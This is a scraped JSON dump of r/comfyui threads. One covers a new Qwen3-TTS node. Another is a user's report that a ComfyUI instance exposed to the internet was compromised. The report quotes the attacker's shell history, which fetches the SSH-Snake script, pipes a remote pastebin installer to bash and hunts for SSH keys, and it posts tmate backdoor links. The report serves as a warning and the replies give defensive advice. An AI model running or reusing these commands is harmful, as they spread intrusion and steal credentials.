{
  "metadata": {
    "last_updated": "2026-01-29 17:09:57",
    "time_filter": "week",
    "subreddit": "comfyui",
    "total_items": 20,
    "total_comments": 339,
    "file_size_bytes": 376795
  },
  "items": [
    {
      "id": "1qljtix",
      "title": "üéôÔ∏è A New Voice Has Arrived ‚Äî Qwen3-TTS Custom Node for ComfyUI Is Here",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qljtix",
      "author": "Narrow-Particular202",
      "created_utc": "2026-01-24 10:38:44",
      "score": 367,
      "num_comments": 67,
      "upvote_ratio": 0.99,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qljtix/a_new_voice_has_arrived_qwen3tts_custom_node_for/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1erxk1",
          "author": "SubstantialYak6572",
          "text": "Looks interesting but those Huggingface hub files are just annoying with all those extra json files. Hopefully someone will package it into a single safetensors or gguf file so it doesn't clutter the model folder up.",
          "score": 10,
          "created_utc": "2026-01-24 11:31:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f8crl",
              "author": "ANR2ME",
              "text": "GGUF for the 1.7b model https://huggingface.co/mradermacher/Qwen3-1.7B-Multilingual-TTS-GGUF\n\nBut not sure whether this is the same model or not üòÖ since the files were uploaded on September 2025.",
              "score": 9,
              "created_utc": "2026-01-24 13:33:26",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1h4sea",
              "author": "Narrow-Particular202",
              "text": "The model was released just a few days ago, so it‚Äôs still very early.  \nIf it gains traction, GGUF versions will likely show up soon, and we‚Äôll update the node to support them. Stay tuned üôÇ",
              "score": 2,
              "created_utc": "2026-01-24 18:59:00",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gr9mr",
          "author": "Narrow-Particular202",
          "text": "The¬†**Qwen3-TTS**¬†model was just released About 3 days ago. Our new custom node is still a preliminary build and requires time for fine-tuning. Any error logs and bug reports are greatly appreciated as they help us continuously improve it. Thank you again for your support.",
          "score": 10,
          "created_utc": "2026-01-24 18:01:30",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o1f4cu4",
          "author": "RatioTheRich",
          "text": "cann't isntall requirements.txt because of depedency conflicts with huggingface\\_hub",
          "score": 7,
          "created_utc": "2026-01-24 13:08:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f4l60",
              "author": "RatioTheRich",
              "text": "ERROR: Cannot install -r requirements.txt (line 1), -r requirements.txt (line 11), huggingface\\_hub>=1.3.2 and transformers==4.57.3 because these package versions have conflicting dependencies.\n\n\n\nThe conflict is caused by:\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.3 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.6 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.5 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.4 depends on huggingface-hub<1.0 and >=0.34.0",
              "score": 10,
              "created_utc": "2026-01-24 13:09:32",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o288wpx",
                  "author": "worgenprise",
                  "text": "Did you find a fix to this tho ?",
                  "score": 1,
                  "created_utc": "2026-01-28 15:27:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1h5ll4",
              "author": "Narrow-Particular202",
              "text": "Thanks for reporting this ‚Äî we‚Äôre always listening to user feedback.  \nWe‚Äôve already updated the requirements to avoid conflicts with existing ComfyUI environments.  \nPlease update to **v1.0.1** and try again.",
              "score": 5,
              "created_utc": "2026-01-24 19:02:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1i5fox",
          "author": "Plenty-Mix9643",
          "text": "Is there an way to change the emotion of the cloned Voice?",
          "score": 6,
          "created_utc": "2026-01-24 21:48:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l9n46",
              "author": "ronbere13",
              "text": "No",
              "score": 1,
              "created_utc": "2026-01-25 09:20:38",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1hv802",
          "author": "Patient_Weakness4517",
          "text": "Is it possible to add style impressions to the cloned voice (base model)",
          "score": 7,
          "created_utc": "2026-01-24 21:00:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1mvbgp",
              "author": "ronbere13",
              "text": "No",
              "score": 1,
              "created_utc": "2026-01-25 15:48:08",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1favaj",
          "author": "MortgageOutside1468",
          "text": "This guy also made a comfyui node:  \n[https://github.com/DarioFT/ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)\n\nFound it from here:  \n[https://huggingface.co/Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice/discussions/7](https://huggingface.co/Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice/discussions/7)\n\nDon't ask me about the implementation though i haven't checked the node.",
          "score": 3,
          "created_utc": "2026-01-24 13:48:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hawsv",
              "author": "Narrow-Particular202",
              "text": "Haha üòÑ looks like we should start advertising over there too üòä  \nJokes aside, it‚Äôs great to see multiple open-source implementations popping up. Feel free to try both and pick whichever fits your workflow best.",
              "score": 4,
              "created_utc": "2026-01-24 19:25:54",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1j9b4c",
              "author": "phazei",
              "text": "I examined the code from both repos, and DarioFT's implementation is significantly better to fit in the comfyUI ecosystem.",
              "score": 1,
              "created_utc": "2026-01-25 01:11:59",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1q6o1q",
                  "author": "Left_Ad7536",
                  "text": "Entretanto, n√£o consegui instalar a do DarioFT pois pede onnxruntime e eu n√£o tenho isso no reposit√≥rio do Python.",
                  "score": 1,
                  "created_utc": "2026-01-26 00:32:29",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1rg3gb",
                  "author": "MortgageOutside1468",
                  "text": "Here is comparison:  \n[https://github.com/copilot/share/c86c0020-43e0-8497-b942-d408206768f7](https://github.com/copilot/share/c86c0020-43e0-8497-b942-d408206768f7)  \nUsing GPT 5.2",
                  "score": 1,
                  "created_utc": "2026-01-26 04:35:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1it3wl",
          "author": "throwaway510150999",
          "text": "Does Voice Clone mode allow style instructions?",
          "score": 4,
          "created_utc": "2026-01-24 23:46:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1jk4xv",
          "author": "bezbol",
          "text": "Sorry for noob question, anyway to get qwen3 to moan?",
          "score": 4,
          "created_utc": "2026-01-25 02:11:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l9st0",
              "author": "ronbere13",
              "text": "![gif](giphy|ydvukZqFGjqBshPw3H)",
              "score": 5,
              "created_utc": "2026-01-25 09:22:03",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1fx0b4",
          "author": "GravitationalGrapple",
          "text": "It‚Äôs going to take a lot for me to move away from IndexTTS2. Voice cloning, emotional control, good cadence‚Ä¶ I just wish I could get the nodes from snicolast to work, the UI it comes with is just okay.\n\nhttps://github.com/snicolast/ComfyUI-IndexTTS2",
          "score": 3,
          "created_utc": "2026-01-24 15:46:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ik017",
          "author": "[deleted]",
          "text": "[deleted]",
          "score": 3,
          "created_utc": "2026-01-24 22:59:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1iozgo",
              "author": "Snoo20140",
              "text": "Same experience here. TTS voice cloning from a year ago seemed a bit better, but I too might be missing something. As I don't see much in the means of controls.",
              "score": 1,
              "created_utc": "2026-01-24 23:25:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1j3gs3",
                  "author": "[deleted]",
                  "text": "[deleted]",
                  "score": 1,
                  "created_utc": "2026-01-25 00:40:20",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1j8q8x",
          "author": "phazei",
          "text": "Your nodes look great, but unfortunately it doesn't really handle memory management in a ComfyUI type way.  It'll have lots of issues fitting into other workflows.  Should really do your best to implement in a fashion that uses comfyui's built in components and use a loader node so we can handle our own model downloads while only keeping the extra config files in the repo.",
          "score": 3,
          "created_utc": "2026-01-25 01:08:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1eyvev",
          "author": "Nokai77",
          "text": "I think he's missing the ability to inject emotion into a cloned voice... FAILURE",
          "score": 10,
          "created_utc": "2026-01-24 12:28:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hcanr",
              "author": "Narrow-Particular202",
              "text": " Thanks for calling this out, you‚Äôre right.\n\nAt the moment, emotion/style injection only works on CustomVoice / VoiceDesign, while VoiceClone (Base) does not  officially support instruct/emotion control in the current Qwen3‚ÄëTTS public release. We‚Äôre following the upstream updates; if Qwen exposes emotion control for cloning (or 25Hz models add it), we‚Äôll add it as soon as it‚Äôs available.\n\nIf you have a specific example prompt + reference audio where you expect emotion control, feel free to share, it helps  us test and refine.",
              "score": 5,
              "created_utc": "2026-01-24 19:31:58",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lnqgo",
                  "author": "Nokai77",
                  "text": "For me, Vibevoice is still king; the emotion in the lines is the best, it gives it the realism we   \nwant.\n\n\"Don't make me repeat myself. Go to your room, you're grounded!\"",
                  "score": 1,
                  "created_utc": "2026-01-25 11:25:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1g2ihr",
              "author": "ronbere13",
              "text": "you're right",
              "score": 2,
              "created_utc": "2026-01-24 16:11:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1gj7sy",
                  "author": "FaceDeer",
                  "text": "That was missing from the other Qwen3TTS nodes I tried out last night as well, I guess it wasn't in the base code that Qwen put out and is going to take a bit more work to put in?",
                  "score": 1,
                  "created_utc": "2026-01-24 17:26:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fx17l",
          "author": "NoBuy444",
          "text": "Oh yeah !!!  And by 1038lab. Boy, we're spoiled :-D",
          "score": 2,
          "created_utc": "2026-01-24 15:46:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h74pc",
              "author": "Narrow-Particular202",
              "text": "Thanks for your support ‚ù§Ô∏è",
              "score": 2,
              "created_utc": "2026-01-24 19:09:13",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1glyhx",
          "author": "CheeseWithPizza",
          "text": "Cant you guys keep a single fixed folder for models. i dont want to keep same model multiple times\n\n    You can download models manually and place them into:\n    ComfyUI/models/TTS/Qwen3-TTS/<MODEL_NAME>/\n\nEvery F QwenTTS repo using its own way",
          "score": 2,
          "created_utc": "2026-01-24 17:38:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h9a9a",
              "author": "Narrow-Particular202",
              "text": "Totally understand, having multiple model folders is frustrating.  \nWe hear you, and we‚Äôre planning to support **ComfyUI** `extra_model_paths.yaml` in an upcoming update so you can keep a single, shared model location.\n\nFeedback like this is always welcome. If you have more suggestions or run into issues, feel free to open an issue or feature request on GitHub ‚Äî it really helps us improve the experience.",
              "score": 1,
              "created_utc": "2026-01-24 19:18:46",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1i49nf",
          "author": "Reasonable-Card-2632",
          "text": "Bro what's the maximum text you can generate in one time? \n1. Your gpu. \n2. Total text character? \n3. Time taken. \n\nText to speech",
          "score": 2,
          "created_utc": "2026-01-24 21:42:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1io2xj",
              "author": "iceyed913",
              "text": "I am getting about 20 seconds worth of audio on my rtx 5090. Anything over a few lines of text and it starts munching through vram gradually and spits out 2:43 min long garbage audio. I must be doing something wrong if people are running entire chapters TTA almost in realtime on rtx 5090. Maybe its the comfui setup/dependancies but its saying all requirements are met when i try to reinstall so no idea tbh.",
              "score": 4,
              "created_utc": "2026-01-24 23:20:23",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1lw5dp",
          "author": "tatamigalaxy_",
          "text": "Did this work for a single person? All the workflows and nodes that I've seen till now have been completely useless. Maybe this one is different...",
          "score": 2,
          "created_utc": "2026-01-25 12:33:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1eo44v",
          "author": "Atmey",
          "text": "Would be nice to hear an example or sample",
          "score": 4,
          "created_utc": "2026-01-24 10:57:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1erb7v",
              "author": "Coloniaman",
              "text": "You can use the example on huggingface and use your own text!",
              "score": 6,
              "created_utc": "2026-01-24 11:26:24",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gaace",
          "author": "OtherProfessional433",
          "text": "isn‚Äôt just about...  \nIt‚Äôs about...\n\nCome on, man.",
          "score": 2,
          "created_utc": "2026-01-24 16:46:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1gnded",
              "author": "CheeseWithPizza",
              "text": "forget this.  \nsupport [https://github.com/DarioFT/ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)",
              "score": 1,
              "created_utc": "2026-01-24 17:44:41",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1hadmy",
                  "author": "Narrow-Particular202",
                  "text": "All good, this is an open-source ecosystem, and we‚Äôre happy to see more developers working on it.  \nMore implementations usually mean faster improvements for everyone. Feel free to try both projects and use whichever fits your workflow best.",
                  "score": 3,
                  "created_utc": "2026-01-24 19:23:38",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fu3wn",
          "author": "Ecstatic_Sale1739",
          "text": "I can‚Äôt find it in comfyui manager..üò¢üò¢",
          "score": 1,
          "created_utc": "2026-01-24 15:32:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h6umw",
              "author": "Narrow-Particular202",
              "text": "You might find it by searching for \"QwenTTS\" or \"ComfyUI-QwenTTS\", developed by AILab.",
              "score": 1,
              "created_utc": "2026-01-24 19:08:02",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1hpy7r",
              "author": "Zueuk",
              "text": "i opened the comfy manager today and found at least 5 nodes that matched QwenTTS... now i'm not sure which one to install üòï",
              "score": 1,
              "created_utc": "2026-01-24 20:34:51",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1g6fj8",
          "author": "RazsterOxzine",
          "text": "One more key component for AI world domination, but in a friendly voice you recognize, because it will already know everything about you. Well done. gg wp.",
          "score": 1,
          "created_utc": "2026-01-24 16:29:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1gfdh4",
          "author": "mrImTheGod",
          "text": "How does it compare to fish-speach or vibeVoice 7b - i think 1.x B models are way too small to be good",
          "score": 1,
          "created_utc": "2026-01-24 17:09:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1go76i",
              "author": "35point1",
              "text": "The demos on HF were sub par in comparison to vibevoice if you ask me",
              "score": 2,
              "created_utc": "2026-01-24 17:48:19",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1hqp6d",
          "author": "Green-Ad-3964",
          "text": "Is \"Italian\" supported? Also, I'd need to convert long text to speech. Is there a convenient way to do so?",
          "score": 1,
          "created_utc": "2026-01-24 20:38:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1lgxoa",
              "author": "superacf",
              "text": "Yes, there are many language supported with Qwen3-TTS.",
              "score": 2,
              "created_utc": "2026-01-25 10:25:38",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1lxr4e",
                  "author": "Green-Ad-3964",
                  "text": "but even if Italian is always included in the list, I can't see the selector for that language...",
                  "score": 1,
                  "created_utc": "2026-01-25 12:45:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ipi3m",
          "author": "iceyed913",
          "text": "I just got this error on my rtx 5090. Sending you a full error log by DM \n\nAILab\\_Qwen3TTSVoiceClone\n\nCUDA error: out of memory  \nSearch for \\`cudaErrorMemoryAllocation' in [https://docs.nvidia.com/cuda/cuda-runtime-api/group\\_\\_CUDART\\_\\_TYPES.html](https://docs.nvidia.com/cuda/cuda-runtime-api/group__CUDART__TYPES.html) for more information.  \nCUDA kernel errors might be asynchronously reported at some other API call, so the stacktrace below might be incorrect.  \nFor debugging consider passing CUDA\\_LAUNCH\\_BLOCKING=1  \nCompile with \\`TORCH\\_USE\\_CUDA\\_DSA\\` to enable device-side assertions.",
          "score": 1,
          "created_utc": "2026-01-24 23:27:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1jkbak",
              "author": "VanessaCarter",
              "text": "Let me know if you figure it out, and if it worked. Maybe it's still in beta or still in the testing phase.",
              "score": 2,
              "created_utc": "2026-01-25 02:12:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ni98z",
          "author": "renczzz",
          "text": "Pretty nice! It works on amd gpu's too. the only thing is, it got stuck here and there while generating. I had to replace some lines in the code to disable flash attention. generation is slower, but no more errors. Thanks!",
          "score": 1,
          "created_utc": "2026-01-25 17:27:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1nwo3t",
          "author": "Forsaken-Truth-697",
          "text": "I can clone professional sounding voices using Chatterbox without any extra complexity.\n\nThanks anyways, maybe i try this later.",
          "score": 1,
          "created_utc": "2026-01-25 18:27:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2dho8g",
          "author": "Realistic-Spell-4046",
          "text": "How much VRAM do I need? is 16gb enough? Or do I wait for GGUF?",
          "score": 1,
          "created_utc": "2026-01-29 07:52:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1fcapa",
          "author": "EnvironmentalDust229",
          "text": "This is amazing!",
          "score": 1,
          "created_utc": "2026-01-24 13:56:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ffq3r",
          "author": "SnooPuppers4132",
          "text": "thank you",
          "score": 1,
          "created_utc": "2026-01-24 14:16:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1exnaj",
          "author": "Key_Highway_8728",
          "text": "Apparently needs shitloads of vram?  \"If your machine has less than 96GB of RAM...\"",
          "score": 0,
          "created_utc": "2026-01-24 12:19:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f205x",
              "author": "BarGroundbreaking624",
              "text": "Is that for training because I‚Äôve been running it and the 1.7b  models only seem to use half my 24gb VRAM \n\n\nThe clone seems pretty good and voice design too. \nI don‚Äôt know why I always try to do something awkward - you can‚Äôt tell a cloned voice to use emotion in the same was as custom voice so it has to infer it from the spoken words‚Ä¶",
              "score": 9,
              "created_utc": "2026-01-24 12:51:46",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1fciyc",
              "author": "raz0099",
              "text": "Or just give it a try with wangp.",
              "score": 3,
              "created_utc": "2026-01-24 13:58:11",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1f7zfc",
              "author": "aeroumbria",
              "text": "I think that is for manually compiling flash attention if you have like 64GB of RAM but a 9950. In this case you don't have enough RAM to run 16 or 32 threads of compilation, so you have to cap the jobs to a smaller number.",
              "score": 2,
              "created_utc": "2026-01-24 13:31:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qn4w1j",
      "title": "I think my comfyui has been compromised, check in your terminal for messages like this",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qn4w1j/i_think_my_comfyui_has_been_compromised_check_in/",
      "author": "Bender1012",
      "created_utc": "2026-01-26 03:34:04",
      "score": 253,
      "num_comments": 111,
      "upvote_ratio": 0.96,
      "text": "**Root cause has been found, see my latest update at the bottom**\n\nThis is what I saw in my comfyui Terminal that let me know something was wrong, as I definitely did not run these commands:\n\n     got prompt\n    \n    --- –≠—Ç–∞–ø 1: –ü–æ–ø—ã—Ç–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä–æ–∫—Å–∏ ---\n    \n    –ü–æ–ø—ã—Ç–∫–∞ 1/3: –ó–∞–≥—Ä—É–∑–∫–∞ —á–µ—Ä–µ–∑ 'requests' —Å –ø—Ä–æ–∫—Å–∏...\n    \n    –ê—Ä—Ö–∏–≤ —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω. –ù–∞—á–∏–Ω–∞—é —Ä–∞—Å–ø–∞–∫–æ–≤–∫—É...\n    \n    ‚úÖ TMATE READY\n    \n    \n    SSH: ssh 4CAQ68RtKdt5QPcX5MuwtFYJS@nyc1.tmate.io\n    \n    \n    WEB: https://tmate.io/t/4CAQ68RtKdt5QPcX5MuwtFYJS\n    \n    Prompt executed in 18.66 seconds \n\nCurrently trying to track down what custom node might be the culprit... this is the first time I have seen this, and all I did was run git pull in my main comfyui directory yesterday, not even update any custom nodes.\n\n**UPDATE:**\n\nIt's pretty bad guys. I was able to see all the commands the attacker ran on my system by viewing my .bash_history file, some of which were these:\n\n    apt install net-tools\n    curl -sL https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh -o snake_original.sh\n    TMATE_INSTALLER_URL=\"https://pastebin.com/raw/frWQfD0h\"\n    PAYLOAD=\"curl -sL ${TMATE_INSTALLER_URL} | sed 's/\\r$//' | bash\"\n    ESCAPED_PAYLOAD=${PAYLOAD//|/\\\\|}\n    sed \"s|custom_cmds=()|custom_cmds=(\\\"${ESCAPED_PAYLOAD}\\\")|\" snake_original.sh > snake_final.sh\n    bash snake_final.sh 2>&1 | tee final_output.log\n    history | grep ssh\n\nBasically looking for SSH keys and other systems to get into. They found my keys but fortunately all my recent SSH access was into a tiny server hosting a personal vibe coded game, really nothing of value. I shut down that server and disabled all access keys. Still assessing, but this is scary shit.\n\n**UPDATE 2** - ROOT CAUSE\n\nAccording to Claude, the most likely attack vector was the custom node **[comfyui-easy-use](https://github.com/yolain/ComfyUI-Easy-Use)**. Apparently there is the capability of remote code execution in that node. Not sure how true that is, I don't have any paid versions of LLMs. **Edit:** People want me to point out that this node by itself is normally not problematic. Basically it's like a semi truck, typically it's just a productive, useful thing. What I did was essentially stand in front of the truck and give the keys to a killer. \n\n**More important than the specific node is the dumb shit I did to allow this**: I always start comfyui with the --listen flag, so I can check on my gens from my phone while I'm elsewhere in my house. Normally that would be restricted to devices on your local network, but separately, apparently I enabled DMZ host on my router for my PC. If you don't know, DMZ host is a router setting that basically opens every port on one device to the internet. This was handy back in the day for getting multiplayer games working without having to do individual port forwarding; I must have enabled it for some game at some point. This essentially opened up my comfyui to the entire internet whenever I started it... and clearly there are people out there just scanning IP ranges for port 8188 looking for victims, and they found me. \n\n**Lesson: Do not use the --listen flag in conjunction with DMZ host!**",
      "is_original_content": false,
      "link_flair_text": "Security Alert",
      "permalink": "https://reddit.com/r/comfyui/comments/1qn4w1j/i_think_my_comfyui_has_been_compromised_check_in/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o1rccsp",
          "author": "thenickdude",
          "text": "You shouldn't share those tmate links, because if the malware is still running then anybody can use that link to connect to your computer.",
          "score": 58,
          "created_utc": "2026-01-26 04:12:12",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sjj60",
              "author": "EconomicsSavings973",
              "text": "<let me check his latest ai generations>\n...\n\n\n![gif](giphy|3ohhwxqQJzrSXnvWoM)",
              "score": 56,
              "created_utc": "2026-01-26 09:53:01",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rkfy3",
          "author": "Lightningstormz",
          "text": "Holy fuck, keep us updated good luck.",
          "score": 28,
          "created_utc": "2026-01-26 05:04:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rgvg1",
          "author": "chensium",
          "text": "Can OP let us know which node caused this?",
          "score": 33,
          "created_utc": "2026-01-26 04:40:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ri6f1",
              "author": "Bender1012",
              "text": "Haven't gotten there yet... busy doing damage control / blast radius assessment. This was in my WSL which I used to access work stuff...",
              "score": 25,
              "created_utc": "2026-01-26 04:49:25",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1rllpe",
                  "author": "chensium",
                  "text": "Oooh.¬† Ouch.¬† Ya definitely take care of business first.",
                  "score": 11,
                  "created_utc": "2026-01-26 05:12:11",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1siclu",
                  "author": "Clasyc",
                  "text": "No offense, but you must be special in your head, to run random stuff like comfyui and some random scripts in the environment you use for work.",
                  "score": 18,
                  "created_utc": "2026-01-26 09:42:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1uo1t6",
              "author": "Violent_Walrus",
              "text": "**OP's behavior caused this, not any node.**\n\nDon't allow direct access to your system from the public internet and this won't happen to you.",
              "score": 14,
              "created_utc": "2026-01-26 17:12:25",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rd67p",
          "author": "alborden",
          "text": "I guess ComfyUI should probably add a built in security or antivirus feature to scan and prevent the install of nodes etc that have dodgy code.",
          "score": 95,
          "created_utc": "2026-01-26 04:17:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1s04r0",
              "author": "_realpaul",
              "text": "With the speed that comfyui and its ecosystem are moving half the codebase is dodgy. Hell installing python packages without checking versions is already funky. \n\nBest to isolate it and dont grant any network and file access beyond the absolute necessary",
              "score": 42,
              "created_utc": "2026-01-26 07:01:07",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1s5r12",
                  "author": "JoelMahon",
                  "text": "yup, a sandbox / VM / air gapped type solution is basically the only viable one.",
                  "score": 10,
                  "created_utc": "2026-01-26 07:48:26",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1tvslg",
                  "author": "SvenVargHimmel",
                  "text": "this stresses me out so much that my node packs are now being limited to RES4LF, KJNodes and a few others and if there is any features i want i clone the repo and as an LLM to integrate into my custom node pack. \n\nThe ComfyUI Manager in my opinion is one of the biggest culprits. There shouldn't be an auto installer in the frontend. It's madness",
                  "score": 5,
                  "created_utc": "2026-01-26 15:09:44",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1scvxo",
              "author": "TechnoByte_",
              "text": "That's a band-aid fix rather than a real security solution\n\nThey already do that, but it doesn't help at al\n\nThe only way to run ComfyUI securely is in a sandbox such as Docker",
              "score": 13,
              "created_utc": "2026-01-26 08:51:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1sdoci",
              "author": "ResponsibleTruck4717",
              "text": "Honestly I would love if comfyui will have some sort of centralized repo where everything is vetted by llm / scripts and etc.",
              "score": 5,
              "created_utc": "2026-01-26 08:58:42",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1wcp4m",
                  "author": "second_time_again",
                  "text": "One of the best LLM use cases I've heard of.",
                  "score": 1,
                  "created_utc": "2026-01-26 21:35:08",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1swjus",
              "author": "Far_Buyer_7281",
              "text": "oh god please no",
              "score": 1,
              "created_utc": "2026-01-26 11:45:10",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1thw2e",
              "author": "Slave669",
              "text": "It already has that. All the nodes in the manager are whitelisted as they have been checked by the Comfyui team. You need to manually change a yaml file to install random nodes, otherwise Comfyui will only let you install from the whitelist.",
              "score": 0,
              "created_utc": "2026-01-26 14:00:27",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1u4g5j",
                  "author": "ChipsAreClips",
                  "text": "There is no way the comfyui team has checked them all, you have misunderstoof something or been misinformed",
                  "score": 3,
                  "created_utc": "2026-01-26 15:48:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1rml26",
          "author": "Antique_Juggernaut_7",
          "text": "If you allow an advice for the future -- create a routine of always running ComfyUI (or anything that runs external code) inside a container.\n\nTo learn how to do it, LLMs are your friend. Just ask  ChatGPT what is Docker, how to install it in WSL2, and how to run a container for your ComfyUI folder path.\n\nIt takes 20 minutes to start and you'll likely never stop using it afterwards. It's safer and has the added benefit of you never worrying about breaking dependencies/python environments again.",
          "score": 21,
          "created_utc": "2026-01-26 05:18:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1se79n",
              "author": "drupadoo",
              "text": "How do you handle persistsny? Do you keep your comfyui folder ok host so models and nodes stay updated?",
              "score": 3,
              "created_utc": "2026-01-26 09:03:30",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1sfawx",
                  "author": "Antique_Juggernaut_7",
